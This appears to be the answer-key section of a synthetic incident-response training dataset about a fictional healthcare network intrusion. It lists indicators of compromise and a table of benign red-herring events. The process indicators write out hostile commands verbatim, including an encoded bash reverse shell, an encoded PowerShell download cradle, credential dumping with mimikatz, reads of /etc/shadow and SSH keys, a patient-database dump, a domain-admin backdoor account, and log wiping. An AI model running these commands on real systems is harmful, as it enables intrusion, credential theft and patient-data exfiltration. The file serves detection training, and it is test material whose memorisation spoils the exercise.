- 203.14.220.10:443 (C2 Server)
- 2j3rhpi2329sn.net (DGA Domain)
- 30rgw6r7503.net (DGA Domain)
- 45.33.32.30:443 (Beacon Target)
- 45.33.32.30:443 (Denied Beacon Target)
- 45.33.32.30:8443 (C2 Server)
- 6cja6syvo02mu.net (DGA Domain)
- DC-01.meridianhcs.local (Malicious DNS Query)
- Message-ID: <100000I9EMNA.1000OREDIL@meridianhcs.com>
- Message-ID: <1000016ONZTK.10015EDCND@meridianhcs.com>
- Message-ID: <121609FF-AFF2-1350-BCEC-8A52032BE7D0@meridianhcs.com>
- Message-ID: <1486572785.976919.3e76dbd7@meridianhcs.com>
- Message-ID: <1746897100.499514.89c6aefa@meridianhcs.com>
- Message-ID: <billing-a1f65b41-3807664@medclaims-processing.net>
- Message-ID: <notices-b9dac45a-8235363@benefits-serviceportal.com>
- Message-ID: <workspace-e2b1dcaf-9440641@docflow-health.net>
- Port 22 (scan target)
- Port 3306 (scan target)
- Port 443 (scan target)
- Port 80 (scan target)
- Port 8080 (scan target)
- Port 8443 (scan target)
- SMTP Zeek UID: C0qZe0LH4s9rggTrvG
- SMTP Zeek UID: C2YGPKAe2bcCObFBPMt
- SMTP Zeek UID: C4ftrB0GMg0JnKsIFS
- SMTP Zeek UID: C8JUf23zsYbSWXAkOBk
- SMTP Zeek UID: C8ZNQiyxA8OzuJ8NHgZ
- SMTP Zeek UID: CKOdtW76YRwPyEfnnGX
- SMTP Zeek UID: CVqlan2GwYmIeguYvJK
- SMTP Zeek UID: CYAUd0CcpV3Vzq3eVu
- SMTP Zeek UID: Ca6zrbE67VirJTnvvO3
- SMTP Zeek UID: Cecrd2bvTZCV73laRLt
- SMTP Zeek UID: CjLmXu5BelbH9LHtYL
- SMTP Zeek UID: CjzVNIp2W29J8EEoaR
- SMTP Zeek UID: Cnf7DkUcyIsOj1R03k
- SMTP Zeek UID: CpmBeS9LWMHl1yhKPr
- SMTP Zeek UID: Czd3G1WQ5KeHNwdO3H
- Zeek UID: C1QRVxaYNAh53OOfPQ
- Zeek UID: C8gep6poaPfAZ9bb39i
- Zeek UID: COF9xnE9QC6CAAvq0
- Zeek UID: COigTtuqz1PJblEyw
- Zeek UID: CS8VXBQDJYLEglZOBc
- Zeek UID: Cf5CCeU5Wn3slmRfrx
- Zeek UID: CgigRBmtKVaiQBxLs6
- Zeek UID: CjJlHqKot8UnudGqWA0
- Zeek UID: CyPRzHadidiHbTWA3
- Zeek UID: CzouobWAdZeFURjBK
- api.westbridge-services.net (Malicious DNS Query)
- edge.westbridge-services.net (Malicious DNS Query)
- ewnjsaqf1rasgez5.net (DGA Domain)
- metrics.westbridge-services.net (Malicious DNS Query)
- ns1.westbridge-services.net (DNS Tunnel Endpoint)
- qrdqtp5nhn66chp00.net (DGA Domain)

### Process IOCs

- /bin/bash
- /usr/bin/cat
- /usr/bin/find
- /usr/bin/gzip
- /usr/bin/ls
- /usr/bin/mysqldump
- /usr/bin/nmap
- /usr/bin/scp
- /usr/bin/shred
- /usr/sbin/ip
- C:\Windows\System32\PSEXESVC.exe
- C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
- C:\Windows\System32\cmd.exe
- C:\Windows\System32\ms-index-service.exe
- C:\Windows\System32\net.exe
- C:\Windows\System32\sc.exe
- C:\Windows\System32\schtasks.exe
- C:\Windows\System32\wevtutil.exe
- C:\Windows\System32\whoami.exe
- Injection Target: C:\Windows\System32\lsass.exe
- Scheduled Task: \Microsoft\Windows\Maintenance\DeviceSync
- Service: DeviceSyncSvc
- Service: PSEXESVC
- `PSEXESVC.exe -accepteula`
- `bash -c 'echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC80NS4zMy4zMi4zMC84NDQzIDA+JjEi | base64 -d | bash'`
- `cat /etc/hosts`
- `cat /etc/passwd`
- `cat /etc/resolv.conf`
- `cat /etc/shadow`
- `cat /root/.ssh/id_rsa`
- `cat /var/www/html/config.php`
- `cmd.exe /c whoami && hostname`
- `find /opt/ehr -name '*credential*' -maxdepth 3`
- `gzip -9 /tmp/rpt_0318.sql`
- `history -c && cat /dev/null > ~/.bash_history`
- `ip addr show`
- `ls -la /root/.ssh`
- `ms-index-service.exe "privilege::debug" "sekurlsa::logonpasswords" exit`
- `mysqldump --single-transaction ehr patients insurance_claims > /tmp/rpt_0318.sql`
- `net group "Domain Admins" /domain`
- `net group "Domain Admins" svc_mhsync /add /domain`
- `net user /domain`
- `net user svc_mhsync /delete /domain`
- `net user svc_mhsync MhsSvc!2024 /add /domain`
- `net view /domain`
- `net view \\FILE-SRV-01`
- `nmap -sT -p 22,80,443,445,3306 10.10.2.0/24`
- `nmap -sn 10.10.2.0/24`
- `powershell.exe -NoProfile -Command "Compress-Archive -Path \\FILE-SRV-01\Finance\Q1\*,\\FILE-SRV-01\Patients\Exports\* -DestinationPath C:\ProgramData\Microsoft\cache_7f3a.zip"`
- `powershell.exe -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwBhAHAAaQAuAHcAZQBzAHQAYgByAGkAZABnAGUALQBzAGUAcgB2AGkAYwBlAHMALgBuAGUAdAAvAHYAMgAvAG0AYQBuAGkAZgBlAHMAdAAiACkA`
- `sc.exe create DeviceSyncSvc binPath= C:\Windows\System32\DeviceSyncSvc.exe obj= LocalSystem start= auto`
- `schtasks.exe /Create /TN "\Microsoft\Windows\Maintenance\DeviceSync" /SC HOURLY /TR "C:\Windows\System32\DeviceSyncSvc.exe" /RU SYSTEM`
- `scp /tmp/rpt_0318.sql.gz root@10.10.2.30:/tmp/.cache/rpt_0318.sql.gz`
- `shred -u /root/.bash_history`
- `wevtutil cl Security`
- `whoami /all`

### User IOCs

- Group: Domain Admins (compromised account)
- SYSTEM (compromised account)
- aisha.johnson (compromised account)
- aisha.johnson (Spray Target) (compromised account)
- apache (compromised account)
- diego.ramirez (compromised account)
- diego.ramirez (Spray Target) (compromised account)
- evelyn.brooks (compromised account)
- lina.nguyen (compromised account)
- marcus.chen (compromised account)
- marcus.chen (Explicit Credential Target) (compromised account)
- omar.haddad (compromised account)
- priya.patel (compromised account)
- root (compromised account)
- sophia.martinez (Spray Target) (compromised account)
- svc_mhsync (compromised account)

### File IOCs

- %SystemRoot%\PSEXESVC.exe
- /root/.bash_history
- /tmp/rpt_0318.sql
- C:\Windows\System32\DeviceSyncSvc.exe
- artifacts/email/benefits-confirmation-msg.eml
- artifacts/email/docflow-ai-summary-msg.eml
- artifacts/email/ehr-release-note-msg.eml
- artifacts/email/executive-operating-note-msg.eml
- artifacts/email/finance-forward-to-it-msg.eml
- artifacts/email/internal-reset-lure-msg.eml
- artifacts/email/vendor-interface-package-msg.eml


## Red Herrings

The following events appear suspicious but are benign. They are included to make the dataset more realistic.

| Timestamp | Actor | System | Activity | Why It's Benign |
|-----------|-------|--------|----------|-----------------|
| 2024-03-18 13:04:44 UTC | sophia.martinez | WS-SMARTINEZ-01 | Sales user mistypes password several times before a normal logon | Sophia had recently changed her password and mistyped it before succeeding; this mimics a lockout-pattern alert without attacker involvement. |
| 2024-03-18 13:04:46 UTC | sophia.martinez | WS-SMARTINEZ-01 | Sales user mistypes password several times before a normal logon | Sophia had recently changed her password and mistyped it before succeeding; this mimics a lockout-pattern alert without attacker involvement. |
| 2024-03-18 13:04:52 UTC | sophia.martinez | WS-SMARTINEZ-01 | Sales user mistypes password several times before a normal logon | Sophia had recently changed her password and mistyped it before succeeding; this mimics a lockout-pattern alert without attacker involvement. |
| 2024-03-18 13:04:54 UTC | sophia.martinez | WS-SMARTINEZ-01 | Sales user mistypes password several times before a normal logon | Sophia had recently changed her password and mistyped it before succeeding; this mimics a lockout-pattern alert without attacker involvement. |
| 2024-03-18 17:09:44 UTC | marcus.chen | DC-01 | Sysadmin performs after-hours RDP maintenance and diagnostics on DC-01 | Marcus was investigating a help desk ticket after normal business hours; the commands are legitimate diagnostics. |
| 2024-03-18 17:09:47 UTC | marcus.chen | DC-01 | Sysadmin performs after-hours RDP maintenance and diagnostics on DC-01 | Marcus was investigating a help desk ticket after normal business hours; the commands are legitimate diagnostics. |
| 2024-03-18 17:09:48 UTC | marcus.chen | DC-01 | Sysadmin performs after-hours RDP maintenance and diagnostics on DC-01 | Marcus was investigating a help desk ticket after normal business hours; the commands are legitimate diagnostics. |
